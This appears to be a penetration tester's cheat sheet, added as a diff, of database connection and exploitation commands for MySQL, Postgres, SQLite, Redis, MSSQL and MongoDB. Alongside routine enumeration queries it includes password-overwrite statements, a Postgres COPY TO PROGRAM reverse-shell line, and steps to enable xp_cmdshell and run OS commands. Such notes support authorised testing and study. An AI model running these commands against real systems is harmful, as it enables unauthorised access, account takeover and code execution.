@@ -1,0 +1,44 @@
+^sql cheatsheet:https://portswigger.net/web-security/sql-injection/cheat-sheet #kali-machine
+mysql (xampp): cd "C:\xampp\mysql\bin" #change directory to XAMPP MySQL binaries; target-machine
+mysql (xampp): .\mysql -u root #attempt local MySQL root (XAMPP often no password); target-machine
+mysql:mysql -h <target> -P <port> -u <user> -p <password> #connect-linux; kali-machine
+mysql:.\mysql.exe -u<user> -p<password> -e 'show databases;' #connect-xampp; target-machine
+mysql:.\mysql.exe -u<user> -p<password> <database> -e 'show tables;' #connect-xampp; target-machine
+mysql:select version(); #version; kali-machine
+mysql:select system_user(); #user; kali-machine
+mysql:show databases #list DBs; kali-machine
+mysql:use <database>; #list DBs; kali-machine
+mysql:show tables; #list tables; kali-machine
+mysql:SELECT * FROM users; #query; kali-machine
+mysql:UPDATE administrators SET user_password='<password>' WHERE user_name='<user>'; #update; kali-machine
+postgres:psql -h <target> -p <port> -U <user> -d <db_name> #connect; kali-machine
+postgres:\l #list DBs; kali-machine
+postgres Connect DB:\c <filename1> #kali-machine
+postgres:\dt #list tables; kali-machine
+postgres Query:SELECT * FROM users; #kali-machine
+postgres Update:UPDATE users SET password='<password>' WHERE username='<user>'; #kali-machine
+postgres Reverse Shell:COPY (SELECT ") TO PROGRAM 'php /var/www/backend/default/uploads/php-reverse-shell.php'; #kali-machine
+sqlite:sqlite3 <filename1> #connect to SQLite database; kali-machine
+sqlite:.tables #list tables; kali-machine
+sqlite:.schema #dump database schema; kali-machine
+sqlite:select * from users; #query table contents; kali-machine
+sqlite:.exit #exit sqlite3 shell; kali-machine
+redis:redis-cli -h <target> #connect; kali-machine
+redis Config Get:CONFIG GET dir #kali-machine
+redis Keys:KEYS * #kali-machine
+redis Get Key:GET <filename1> #kali-machine
+redis Set Key:SET <filename1> "<password>" #target-machine
+redis Auth:AUTH <password> #kali-machine
+mssql:impacket-mssqlclient <user>:<password>@<target> -windows-auth #connect via impacket using Windows auth; kali-machine
+mssql:sqsh -S <target>:<port> -U <user> -P <password> #connect via sqsh; kali-machine
+mssql:select @@version; #enumerate SQL Server version; kali-machine
+mssql:select name from master.dbo.sysdatabases; #list databases (legacy); kali-machine
+mssql:select name from sys.databases; #list databases (modern); kali-machine
+mssql:use <database>; #switch database context; kali-machine
+mssql:select * from <database>.information_schema.tables; #list tables in database; kali-machine
+mssql:select * from <database>.dbo.<table>; #dump table contents; kali-machine
+mssql:select * from users; #dump users table; kali-machine
+mssql:update users set password='<password>' where username='<user>'; #overwrite user password; kali-machine
+mssql:exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; #enable xp_cmdshell; kali-machine
+mssql:exec xp_cmdshell '<command>'; #execute OS command via SQL Server; kali-machine
+mongodb:mongosh —host <target>:<port> #connect; kali-machine
